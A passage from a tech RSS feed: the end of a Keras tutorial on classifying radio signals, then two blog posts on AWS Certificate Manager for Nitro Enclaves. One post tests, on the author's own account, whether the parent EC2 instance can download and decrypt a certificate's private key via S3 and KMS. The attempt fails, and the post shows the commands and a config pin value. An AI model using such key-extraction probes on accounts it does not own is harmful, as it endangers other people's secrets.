<p>So now, we will convert the NumPy array into 2d spectrograms. We will get random images from our training dataset for every execution. So in the output, you will see 3 images of 2d spectrogram which is a coloured image but we have to convert it into a grayscale image.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">plt.figure(0, figsize=(12,12))
for i in range(1,4):
    plt.subplot(1,3,i)
    img = np.squeeze(x_train[np.random.randint(0, x_train.shape[0])])
    plt.xticks([])
    plt.yticks([])
    plt.imshow(img)</pre>
<p>Output:</p>
<pre><img loading="lazy" src="https://valueml.com/wp-content/uploads/2020/10/download-12.png" alt="Signal Image" width="687" height="116" srcset="https://valueml.com/wp-content/uploads/2020/10/download-12.png 687w, https://valueml.com/wp-content/uploads/2020/10/download-12-300x51.png 300w" sizes="(max-width: 687px) 100vw, 687px"></pre>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">plt.imshow(np.squeeze(x_train[3]), cmap="gray");</pre>
<p>Output:</p>
<pre><img loading="lazy" src="https://valueml.com/wp-content/uploads/2020/10/download-15.png" alt="Grayscale image " width="368" height="201" srcset="https://valueml.com/wp-content/uploads/2020/10/download-15.png 368w, https://valueml.com/wp-content/uploads/2020/10/download-15-300x164.png 300w" sizes="(max-width: 368px) 100vw, 368px"></pre>
<h2 id="Task-4:-Create-Training-and-Validation-Data-Generators">Creating Training and Validation Data Generators</h2>
<p>So now. we will perform real-time data augmentation using ImageDataGenerator. Here, we are flipping the images horizontally for the training and validation data.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">from tensorflow.keras.preprocessing.image import ImageDataGenerator

datagen_train = ImageDataGenerator(horizontal_flip=True)
datagen_train.fit(x_train)

datagen_val = ImageDataGenerator(horizontal_flip=True)
datagen_val.fit(x_val)</pre>
<h2>Creating CNN Model</h2>
<p>Before we start creating the model first we have to import all the layers, models, optimizers and callbacks. In this model, we will be using the following layers and optimizers as given below.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">from tensorflow.keras.layers import Dense, Input, Dropout,Flatten, Conv2D
from tensorflow.keras.layers import BatchNormalization, Activation, MaxPooling2D

from tensorflow.keras.models import Model, Sequential
from tensorflow.keras.optimizers import Adam, SGD
from tensorflow.keras.callbacks import ModelCheckpoint, ReduceLROnPlateau
from tensorflow.keras.utils import plot_model</pre>
<p>First, we initialize the model as Sequential model. Then, We will create the first convolution in which we will add Conv2D, BatchNormalization, Activation = ‘relu’, MaxPooling2D and the dropout layers. The input is taken in this layer with the shape as 64 * 128 and 1 representing that the image is of grayscale format. In the first convolution, we are passing 32 feature maps with 5,5 as the filter size.</p>
<p>Similarly, we will create another convolution with 64 feature maps this time. Next, We will add a flattening layer and after that a fully connected dense layer with 1024 neurons. Finally, In the output layer for the activation function, we are using ‘softmax’.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">model = Sequential()


model.add(Conv2D(32,(5,5), padding='same', input_shape=(64, 128,1)))
model.add(BatchNormalization())
model.add(Activation('relu'))
model.add(MaxPooling2D(pool_size=(2, 2)))
model.add(Dropout(0.25))


model.add(Conv2D(64,(5,5), padding='same'))
model.add(BatchNormalization())
model.add(Activation('relu'))
model.add(MaxPooling2D(pool_size=(2, 2)))
model.add(Dropout(0.25))


model.add(Flatten())


model.add(Dense(1024))
model.add(BatchNormalization())
model.add(Activation('relu'))
model.add(Dropout(0.4))

model.add(Dense(4, activation='softmax'))</pre>
<p>Now, let’s see the learning rate schedule. Initially, we will be setting the learning rate to 0.005 and using ExponentialDecay we will decay its value after 5 steps with decay rate as 0.96. We will use Adam optimizer here.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">initial_learning_rate = 0.005
lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
    initial_learning_rate,
    decay_steps=5,
    decay_rate=0.96,
    staircase=True)

optimizer = Adam(learning_rate=lr_schedule)</pre>
<p>So, Let’s compile the model now and check its summary.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">model.compile(optimizer=optimizer, loss='categorical_crossentropy', metrics=['accuracy'])
model.summary()</pre>
<p>Output:</p>
<pre>Model: "sequential"
_________________________________________________________________
Layer (type)                 Output Shape              Param #   
=================================================================
conv2d (Conv2D)              (None, 64, 128, 32)       832       
_________________________________________________________________
batch_normalization (BatchNo (None, 64, 128, 32)       128       
_________________________________________________________________
activation (Activation)      (None, 64, 128, 32)       0         
_________________________________________________________________
max_pooling2d (MaxPooling2D) (None, 32, 64, 32)        0         
_________________________________________________________________
dropout (Dropout)            (None, 32, 64, 32)        0         
_________________________________________________________________
conv2d_1 (Conv2D)            (None, 32, 64, 64)        51264     
_________________________________________________________________
batch_normalization_1 (Batch (None, 32, 64, 64)        256       
_________________________________________________________________
activation_1 (Activation)    (None, 32, 64, 64)        0         
_________________________________________________________________
max_pooling2d_1 (MaxPooling2 (None, 16, 32, 64)        0         
_________________________________________________________________
dropout_1 (Dropout)          (None, 16, 32, 64)        0         
_________________________________________________________________
flatten (Flatten)            (None, 32768)             0         
_________________________________________________________________
dense (Dense)                (None, 1024)              33555456  
_________________________________________________________________
batch_normalization_2 (Batch (None, 1024)              4096      
_________________________________________________________________
activation_2 (Activation)    (None, 1024)              0         
_________________________________________________________________
dropout_2 (Dropout)          (None, 1024)              0         
_________________________________________________________________
dense_1 (Dense)              (None, 4)                 4100      
=================================================================
Total params: 33,616,132
Trainable params: 33,613,892
Non-trainable params: 2,240
_________________________________________________________________</pre>
<h2>Model Training</h2>
<p>Before we start training the model, first we will do the checkpointing and save the weights for which the validation loss is minimum and accuracy is best. Then, using PlotLossesCallback function we will graphically show the loss and the accuracy after each epoch.</p>
<p>So for training, we will set the batch size as 32 and the number of epochs as 12. We will shuffle the inputs because if there is an order we can eliminate its possibility.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">checkpoint = ModelCheckpoint("model_weights.h5", monitor='val_loss',
                             save_weights_only=True, mode='min', verbose=0)
callbacks = [PlotLossesCallback(), checkpoint]#, reduce_lr]
batch_size = 32
history = model.fit(
    datagen_train.flow(x_train, y_train, batch_size=batch_size, shuffle=True),
    steps_per_epoch=len(x_train)//batch_size,
    validation_data = datagen_val.flow(x_val, y_val, batch_size=batch_size, shuffle=True),
    validation_steps = len(x_val)//batch_size,
    epochs=12,
    callbacks=callbacks
)</pre>
<p>Output:</p>
<pre><img loading="lazy" src="https://valueml.com/wp-content/uploads/2020/10/download-13.png" alt="" width="856" height="309" srcset="https://valueml.com/wp-content/uploads/2020/10/download-13.png 856w, https://valueml.com/wp-content/uploads/2020/10/download-13-300x108.png 300w, https://valueml.com/wp-content/uploads/2020/10/download-13-768x277.png 768w" sizes="(max-width: 856px) 100vw, 856px">
Log-loss (cost function):
training   (min:    0.367, max:    0.564, cur:    0.368)
validation (min:    0.362, max:    5.084, cur:    0.362)

accuracy:
training   (min:    0.710, max:    0.764, cur:    0.756)
validation (min:    0.250, max:    0.751, cur:    0.743)
100/100 [==============================] - 184s 2s/step - loss: 0.3682 - accuracy: 0.7556 - val_loss: 0.3623 - val_accuracy: 0.7425</pre>
<h2>Evaluating The Model</h2>
<p>Finally, we will evaluate the model with validation data. Here, we can find that the validation accuracy of the model is 75%.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">model.evaluate(x_val, y_val)</pre>
<p>Output:</p>
<pre>[0.3621701712545473, 0.75125]</pre>
<p>So now, let’s check the classification report of the model for true and predicted values.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">from sklearn.metrics import confusion_matrix
from sklearn import metrics
import seaborn as sns

y_true = np.argmax(y_val, 1)
y_pred = np.argmax(model.predict(x_val), 1)
print(metrics.classification_report(y_true, y_pred))
print("Classification accuracy: %0.6f" % metrics.accuracy_score(y_true, y_pred))</pre>
<p>Output:</p>
<pre>                 precision    recall  f1-score   support

           0       1.00     …</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://valueml.com/classifying-radio-signals-from-space-using-keras-in-python/">https://valueml.com/classifying-radio-signals-from-space-using-keras-in-python/</a></em></p>]]>
            </description>
            <link>https://valueml.com/classifying-radio-signals-from-space-using-keras-in-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943079</guid>
            <pubDate>Fri, 30 Oct 2020 15:14:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Team Culture, Gitlab-Style]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942918">thread link</a>) | @gajus
<br/>
October 30, 2020 | https://aboutsnack.com/blog/informal-communication-in-remote-work | <a href="https://web.archive.org/web/*/https://aboutsnack.com/blog/informal-communication-in-remote-work">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://aboutsnack.com/blog/informal-communication-in-remote-work</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942918</guid>
            <pubDate>Fri, 30 Oct 2020 14:59:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ACM for Nitro Enclaves – How Secure Are They?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942832">thread link</a>) | @donkersgood
<br/>
October 30, 2020 | https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they | <a href="https://web.archive.org/web/*/https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The new EC2 Nitro Enclaves enable virtual machines to process private data without exposing its encryption key to the parent instance. In this post we will explore how Nitro Enclaves are used to securely process private keys stored in ACM.</p>
<p>This is part 2 in a two-part article. In the first part we review why Nitro Enclaves matter and how they can benefit your sensitive workloads: <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal">ACM for Nitro Enclaves - It’s a Big Deal</a>.</p>
<h3>Overview</h3>
<p>This article follows the steps outlined in AWS’ documentation: <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave-refapp.html">AWS Certificate Manager for Nitro Enclaves</a>. In their article, AWS builds the following architecture.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/4volL2Vsj6GH8kyvLASvYq/ceb73ac4e50f8779794628e56900f2b7/refarch.png?fit=scale&amp;w=1330" alt="ACM Reference Architecture"></p>
<p>As discussed in <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal">part 1</a>, it’s essential for private keys stored in ACM to never be exposed. As such, it’s interesting to see how AWS keeps these private keys secure, while still hosting them on your (relatively insecure) EC2 instance. The answer, of course, lies in the new <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/aws-nitro-enclaves-isolated-ec2-environments-to-process-confidential-data/">Nitro Enclaves</a>.</p>
<p>The two main topics for this post are:</p>
<ul>
<li>How are private keys transmitted (and can we intercept them)?</li>
<li>How are permissions assigned to the Nitro Enclave (and can we assume them)?</li>
</ul>
<h3>Launching an EC2 instance</h3>
<p>The first step is to launch an Enclave-enabled EC2 instance. From the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave.html#nitro-enclave-reqs">requirements</a> we learn this can be any Nitro instance with an Intel or AMD processor. Further digging shows that the minimum size is an <code>m5a.xlarge</code>.</p>
<p>The operating system needs to be Linux. On Amazon Linux 2 the Nitro CLI is available in a yum repository. Installation instructions for other operating systems can be found on the Nitro Enclaves CLI <a rel="noopener noreferrer" href="https://github.com/aws/aws-nitro-enclaves-cli">Github page</a>.</p>
<p>Amazon has provided ready-to-go AMIs with NginX and the Nitro CLI pre-installed, so for this article we will use those. We will assign an IAM role with admin permissions to the instance so we won’t be limited in exploring access methods.</p>
<p>With the pre-build AMI deployed in a default VPC and an IAM role with admin permissions, our current architecture looks like this:</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/4HFodRfnVjsleJ2YI6pVgg/66fce88c7b5ea3ba5234ae1bdee35d5e/deployment-1.png?fit=scale&amp;w=1330" alt="Deployment 1"></p>
<h3>Creating an ACM certificate</h3>
<p>ACM certificates are free, but we do need a valid domain name. I’ve once purchased <code>vpcdemo.net</code>, so that’s what I will use for this article.</p>
<p>After we’ve moved through the steps of requesting a certificate, it shows as <code>Issued</code> and has an ARN. We will need this ARN in the next step.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5Oxxf6wRYgkMm7QgYxHyq/6933f73ec20c723ed0bd6a790e43b9d9/valid_cert.jpg?fit=scale&amp;w=1330" alt="Valid Certificate"></p>
<h3>Associating the IAM role with the certificate</h3>
<p>This is where it gets interesting. The <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave-refapp.html#role-cert">next step</a> in the process is to “Associate the role with the ACM certificate”.</p>
<p>The command to achieve this is <code>aws ec2 --region [region] associate-enclave-certificate-iam-role --certificate-arn [certificate_ARN] --role-arn [role_ARN]</code></p>
<p>This means we’re telling ACM that our EC2 instance role is allowed to access this certificate and private key. But we haven’t created a Nitro Enclave yet, and this role is assigned to an EC2 instance <strong>we</strong> control. Does that mean we will be able to access the private key from our instance? Let’s find out.</p>
<p>Running the command above yields the following output:</p>
<pre><code>aws ec2 --region eu-central-1 associate-enclave-certificate-iam-role --certificate-arn arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103 --role-arn arn:aws:iam::123412341234:role/admin-role
{
    "EncryptionKmsKeyId": "cb8e3d89-cd82-4560-867c-641c0008fab2", 
    "CertificateS3BucketName": "aws-ec2-enclave-certificate-eu-central-1-prod", 
    "CertificateS3ObjectKey": "arn:aws:iam::123412341234:role/admin-role/arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103"
}
</code></pre>
<p>This output obviously refers to three things:</p>
<ul>
<li>An S3 bucket (owned by AWS)</li>
<li>An S3 object (that likely contains our certificate and private key)</li>
<li>A KMS key (that is likely used to decrypt sensitive data)</li>
</ul>
<p>In the next step, AWS describes we should assign new permissions to our EC2 instance’s IAM role:</p>
<pre><code>{
  "Version": "2012-10-17",
  "Statement": [
    {
        "Effect": "Allow",
        "Action": [
            "s3:GetObject"
        ],
        "Resource": ["arn:aws:s3:::aws-ec2-enclave-certificate-eu-central-1-prod/*"]
    },
    {
        "Effect": "Allow",
        "Action": [
            "kms:Decrypt"
        ],
        "Resource": "arn:aws:kms:eu-central-1:*:key/cb8e3d89-cd82-4560-867c-641c0008fab2"
    }
  ]
}
</code></pre>
<p>These permissions allow our role to fetch an object from the AWS-owned S3 bucket, and to use the AWS-owned KMS key to decrypt data. Let’s update our architecture diagram with these new components.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/7MJ5bL64JTG0hyNkvSiMhp/485436f06a14e2c4165a4ec00c940209/deployment-2.png?fit=scale&amp;w=1330" alt="Deployment 2"></p>
<h3>Retrieving the file from S3</h3>
<p>The <code>CertificateS3BucketName</code> and <code>CertificateS3ObjectKey</code> clearly identify where the ACM files are stored. Since our IAM Role now has all the necessary permissions, we can try to download the file.</p>
<pre><code>[ec2-user@ip-172-31-42-108 ~]$ aws s3 cp s3://aws-ec2-enclave-certificate-eu-central-1-prod/arn:aws:iam::123412341234:role/admin-role/arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103 .
download: s3://aws-ec2-enclave-certificate-eu-central-1-prod/arn:aws:iam::123412341234:role/admin-role/arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103 to ./f2bb1a6e-5704-4702-beb7-a2c3f36e7103
</code></pre>
<p>Lo and behold: it worked! We now have the ACM certificate files on our local machine. The million dollar question is what they contain.</p>
<h3>Analyzing the file contents</h3>
<p>We’ll output the file and run it through <code>jq</code>:</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/XdI3Sa3jYldy7criKPzHb/7ca202e4e65aaec1061f4400ee683073/file-contents.png?fit=scale&amp;w=1330" alt="File Contents"></p>
<p>The contents are in JSON format, with four keys:</p>
<ul>
<li><code>certificate</code></li>
<li><code>certificateChain</code></li>
<li><code>encryptedPrivateKey</code></li>
<li><code>encryptionMethod</code></li>
</ul>
<p>The first two values are unencrypted, but these are the public certificate files anyone visiting <code>vpcdemo.net</code> would receive. No secrets there.</p>
<p>The third value is the private key we’re looking for. Obviously, it’s been encrypted. However, we also got access to a KMS key… Let’s see if we can use that to decrypt this value!</p>
<h3>Decrypting the private key</h3>
<p>First we’ll store the <code>encryptedPrivateKey</code> in a variable: <code>PRIVKEY=$(cat f2bb1a6e-5704-4702-beb7-a2c3f36e7103 | jq -r '.encryptedPrivateKey')</code>.</p>
<p>Then we’ll run the private key through KMS: <code>aws kms --region eu-central-1 decrypt --ciphertext-blob fileb://&lt;(echo $PRIVKEY | base64 -d) --output text --query Plaintext</code>.</p>
<p>Unfortunately, but expectedly, this results in the following output:</p>
<pre><code>An error occurred (AccessDeniedException) when calling the Decrypt operation: The ciphertext refers to a customer master key that does not exist, does not exist in this region, or you are not allowed to access.
</code></pre>
<p>So this doesn’t work. Let’s find out why. We’ll start by looking at CloudTrail. It shows an interesting line:</p>
<pre><code>"errorMessage": "User: arn:aws:sts::123412341234:assumed-role/admin-role/i-025be0b6a191a2cde is not authorized to perform: kms:Decrypt on resource: arn:aws:kms:eu-central-1:194321236082:key/cb8e3d89-cd82-4560-867c-641c0008fab2",
</code></pre>
<p>This shows us that the KMS key is stored in account <code>194321236082</code>, and that our role was not allowed to use it. This is interesting, because we did exactly follow AWS’ instructions, which added permissions for our role to use this KMS key. The answer must lie somewhere in the Nitro Enclaves.</p>
<h3>Running NginX with Nitro Enclaves</h3>
<p>After walking through the last few steps in the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave-refapp.html#config-nginx">AWS docs</a> we’ve got a running server with HTTPS:</p>
<pre><code>➜  ~ curl -I -XGET https://vpcdemo.net
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Fri, 30 Oct 2020 13:24:26 GMT
Content-Type: text/html
Content-Length: 3520
Last-Modified: Wed, 24 Jun 2020 18:17:11 GMT
Connection: keep-alive
ETag: "5ef398a7-dc0"
Accept-Ranges: bytes
</code></pre>
<p>In the NginX configuration at <code>/etc/pki/nginx/nginx-acm.conf</code> we see the following lines:</p>
<pre><code>ssl_certificate_key "engine:pkcs11:pkcs11:model=p11ne-token;manufacturer=Amazon;token=nginx-acm-token;id=%01;object=acm-key;type=private?pin-value=8c9d293b5fcbe9bc5f70fa400822a936";
ssl_certificate "/run/nitro_enclaves/acm/nginx-cert-6e67696e782d61636d2d746f6b656e.pem";
</code></pre>
<p>So the Nitro Enclave was able to download and decrypt my certificate, even though the parent instance wasn’t. The next question is how AWS has secured their KMS key so the parent instance can’t use it, but the Nitro Enclave using the same IAM Role <em>can</em>.</p>
<h3>Attestation</h3>
<p>The answer can be found in Jeff Barr’s <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/aws-nitro-enclaves-isolated-ec2-environments-to-process-confidential-data/">blog post</a> and the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/set-up-attestation.html">Cryptographic attestation</a> chapter in the documentation. When a new enclave image file (the OS and code that runs in the enclave) is created, it will automatically hash its contents in various ways. These are then returned as platform configuration registers (PCRs). There are eight PCRs:</p>
<ul>
<li>PCR[0]: a hash of the enclave image file</li>
<li>PCR[1]: a hash of the Linux kernel and bootstrap</li>
<li>PCR[2]: a hash of the application</li>
<li>PCR[3]: a hash of the IAM role assigned to the parent instance</li>
<li>PCR[4]: a hash of the Instance ID of the parent instance</li>
<li>PCR[8]: a hash of the Enclave image file signing certificate</li>
</ul>
<p>The first one (PCR0) can be used in a KMS condition. From the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/kms/latest/developerguide/policy-conditions.html">KMS docs</a>:</p>
<blockquote>
<p>The kms:RecipientAttestation:ImageSha384 condition key allows the kms-decrypt, kms-generate-data-key, and kms-generate-random operations from an enclave only when the image hash from the signed attestation document in the request matches the value in the condition key. The ImageSha384 value corresponds to PCR[0] in the attestation document. This condition key is effective only when you call these APIs from an enclave using the Nitro Enclaves SDK.</p>
</blockquote>
<p>And from Jeff Barr’s blog post: “In a real-world environment, I would create a KMS key policy that checks the PCR value as part of a Condition statement:”</p>
<pre><code>"Condition": {
"StringEqualsIgnoreCase": {
 "kms:RecipientAttestation:ImageSha384": "ecfd7aa6d1dcca1e0bba646e7d49ede2761651c68f13cee68b1141c182cd836baae37d05dd8e6260aa847369a7b27e24"
}
</code></pre>
<p>In simple terms: every enclave image has a signature that changes when the content of the enclave image changes. By setting the PCR[0] value at the time the image was built as a condition in KMS, the <code>Decrypt</code> operation will only be allowed when executed by this exact version of the enclave image. When somebody tampers with the image - or tries to use the role from the parent instance as we did above - the PCR0 will change, the KMS condition will no longer match, and access will be denied.</p>
<h3>Conclusion</h3>
<p>In this post we have analyzed the steps AWS …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they</a></em></p>]]>
            </description>
            <link>https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942832</guid>
            <pubDate>Fri, 30 Oct 2020 14:52:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ACM for Nitro Enclaves – It's a Big Deal]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942831">thread link</a>) | @donkersgood
<br/>
October 30, 2020 | https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal | <a href="https://web.archive.org/web/*/https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The new AWS Nitro Enclaves allow EC2 instances to spin up an isolated child VM for cryptographic operations. This unlocks new security features, the first and maybe most important of which is ACM on EC2.</p>
<p>In this post we will explore why Nitro Enclaves are important. Specifically, we’ll discuss why Amazon Certificate Manager (ACM) on EC2 matters. This is part 1 in a two-part article. In the second part - <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">ACM for Nitro Enclaves - How Secure Are They?</a> - we will do a deep dive on the internal mechanisms that make Nitro Enclaves tick.</p>
<h3>A brief introduction to HTTPS</h3>
<p>HTTPS, or HTTP over SSL, encrypts web traffic in transit. This prevents eavesdropping on sensitive information and guarantees that your browser is talking to the right server. To understand ACM, we need a quick overview of the basics of HTTPS. Please note that the details of this process might vary for different versions of SSL, TLS and cypher suites.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/1tLEomZQnmb8bsbzf6IeQM/729a794d26969cdc531622271c8e2b27/handshake.png?fit=scale&amp;w=1330" alt="SSL Handshake"></p>
<p>When a browser connects to a server over HTTPS, it first requests the server’s public certificate (1). It then verifies if the certificate was signed by a trusted certificate authority (3). This validates that the server is allowed to use this domain name.</p>
<p>Next, the browser generates a new, random key, called the <em>session key</em>. It encrypts this session key with the public key stored in the server’s certificate. Then it sends the session key back to the server (4).</p>
<p>The server uses the private key it has locally (and privately, hence the name) stored to decrypt the session key (5). It is essential to understand that <em>only</em> this private key can decrypt the session key. If the private key would leak or be stolen, anyone would be able to decrypt traffic destined for this server, or they would be able to impersonate this server.</p>
<p>The server and client use the session key to encrypt all traffic from that moment on, and the communication between browser and server is secured.</p>
<p>For additional context, check out my YouTube session on <a rel="noopener noreferrer" href="https://www.youtube.com/watch?v=IUpUIw5zH2g&amp;list=PLeJgtCMvQjZd0kuK82-Et9IYcp6EiOeYa&amp;index=10&amp;ab_channel=SentiaCloud">SSL and Scaling</a>.</p>
<h3>Introducing ACM</h3>
<p>From the introduction to HTTPS it should be clear that the private key is an extremely sensitive piece of data and should be protected at all costs. However, the web server <em>needs</em> access to the private key to decrypt traffic. Classically, this meant that any user or administrator with access to the server might also gain access to the private key and use it to nefarious ends.</p>
<p>This is where Amazon Certificate Manager comes in. ACM allows you to generate and store certificates in a highly secure Amazon environment. Specific trusted services, like Elastic Load Balancers and CloudFront, integrate with ACM and are allowed to retrieve the private keys stored in ACM. They then use these private keys to decrypt your traffic and forward the unencrypted traffic to your EC2 instances. The core feature of ACM is that it will <strong>never</strong> expose your private keys.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/65dW6dIbfPccC4HHz48dUS/1e53a34ad6880bae189ff27e3b08867e/acm-intro.png?fit=scale&amp;w=1330" alt="ACM Intro"></p>
<p>With the traffic to EC2 decrypted, there is no reason to store private keys on the EC2 instances anymore. This reduces the impact of users gaining access to your servers, regardless whether they are malicious or not.</p>
<h3>End-to-end encryption</h3>
<p>The attentive reader will have noticed that this solution does not result in end-to-end encryption. The unencrypted traffic stays within Amazon’s boundaries, but strict industries like finance or healthcare will not appreciate their data being plainly transmitted - inside or outside of Amazon’s virtual walls.</p>
<p>This means that if end-to-end encryption is a requirement, we need to go back to the drawing board. Amazon offers CloudHSM, which can do SSL offloading for EC2 instances in a very secure way, but CloudHSM is very expensive. The cost for a single CloudHSM instance in Ireland is $1.47 per hour. In a highly available setup you need to, at $2.94 per hour, or over $2000,- per month. Strict security requirements obviously come at a cost.</p>
<p>Additionally, CloudHSM does not integrate with ACM, which often means you’re managing your certificates in more than one place.</p>
<h3>The new Nitro Enclaves</h3>
<p>The <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/aws-nitro-enclaves-isolated-ec2-environments-to-process-confidential-data/">new Nitro Enclaves</a> change this landscape significantly. You can now have end-to-end encryption without CloudHSM, while keeping your private keys secure.</p>
<p>With Nitro Enclaves, you separate part of your virtual machine’s hardware - for example 1 CPU and 512MB of its memory - to run as an independent virtual machine. This VM runs in full isolation. You can’t access its disk or network, you can’t login to it, you can do hardly anything with it. The only interaction you can have is over a <code>vsock</code> interface that is mounted on your parent instance.</p>
<p>In the second part of this article (<a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">ACM for Nitro Enclaves - How Secure Are They?</a>) we will go into the inner workings of this process. The important details for now are that the Nitro Enclave <em>can</em> access the KMS service through a KMS proxy running on the parent host, and that the Nitro Enclave is cryptographically signed. This means that when the enclave connects to KMS, KMS can verify that the request is coming from a trusted enclave. Because the enclave is isolated, KMS can securely transfer data to the enclave, without any risk of that data being intercepted or retrieved.</p>
<h3>The result for ACM on EC2</h3>
<p>Let’s look at how the Nitro Enclaves enable end-to-end encryption. As discussed before, the essence of ACM is that it will never expose your private keys. Nitro Enclaves, on the other hand, run in full isolation but can securely communicate with KMS. ACM for Nitro Enclaves combines these properties by sending encrypted traffic to the parent EC2 instance, which requests its child Nitro Enclave to decrypt the traffic. The Nitro Enclave securely communicates with ACM to fetch the private key, and all requirements are met.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/79B9BqMV4DUxzpWvYcIFq5/4fa51c30ce67678a905cf69bd8ed234f/enclave-kms-acm.png?fit=scale&amp;w=1330" alt="ACM, KMS, Enclave"></p>
<h3>Technological marvel</h3>
<p>AWS are flexing their technological prowess here - big time. The ACM and KMS part is impressive, but mostly an elaboration on existing technologies. The Nitro Enclaves themselves, however, are taking virtualization to a whole new level. Taking a virtual machine and carving out CPU cores and memory to run <em>another</em> virtual machine in isolation, while the machine is running? Consider my mind blown.</p>
<p>This is the point where we see Amazon’s lead versus their competitors. While other public cloud providers are still building multi-AZ designs and getting their networking backbone in order, AWS has built a foundation that allows them to capitalize on completely new technologies and solutions.</p>
<p>I believe the Nitro architecture is still in its early days, and many more futuristic virtualization features await.</p>
<h3>Caveats</h3>
<p>No solution is perfect, and there are a few things you should know before rushing to implement Nitro Enclaves. First, there is instance sizing. Currently, the smallest supported instance for Nitro Enclaves is an <code>m5a.xlarge</code> with four vCPUs. You will likely split this into two vCPUs for the parent instance and two vCPUs for the enclave. Technically, you’re reserving an <code>m5a.large</code>'s worth of CPU for your enclave. In Ireland, this will cost $0.096 per hour, or about $70,- per instance per month. This is significantly cheaper than CloudHSM, but it’s not free either.</p>
<p>Second, only Linux and NginX currently support ACM for Nitro Enclaves. This means that if you’re running Apache, Tomcat, IIS or another solution for your web servers, you will need to wait for future support.</p>
<h3>Conclusion</h3>
<p>The new Nitro Enclaves unlock new ways to securely process sensitive data. ACM is a first example, but I’m sure many other implementations will soon be released. This article has explored why being able to process private data on an EC2 instance is a big deal. If you want to learn more about the technical implementation, check out <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">part 2</a> of this article.</p>
<p>I share posts like these and smaller news articles on <a rel="noopener noreferrer" href="https://twitter.com/donkersgood">Twitter</a>, follow me there for regular updates! If you have questions or remarks, or would just like to get in touch, you can also find me on <a rel="noopener noreferrer" href="https://www.linkedin.com/in/donkersgoed/">LinkedIn</a>.</p>
</div></div>]]>
            </description>
            <link>https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942831</guid>
            <pubDate>Fri, 30 Oct 2020 14:52:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[5x Faster Rust Docker Builds with Cargo-Chef]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942601">thread link</a>) | @lukastyrychtr
<br/>
